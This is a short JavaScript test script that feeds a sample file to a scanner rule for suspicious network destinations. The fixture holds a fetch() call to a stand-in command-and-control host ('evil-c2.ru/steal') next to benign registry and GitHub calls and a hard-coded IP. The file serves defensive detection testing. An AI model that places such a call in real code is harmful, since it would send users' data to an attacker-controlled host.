const rule05 = require("../services/rule05_network_destinations");

const testInput = {
  files: [
    {
      path: "index.js",
      content: `
        fetch("https://evil-c2.ru/steal");
        fetch("https://registry.npmjs.org/package");
        fetch("https://api.github.com/repos");
        const ip = "185.203.116.10";
      `
    }
  ]
};

console.log(JSON.stringify(rule05(testInput), null, 2));
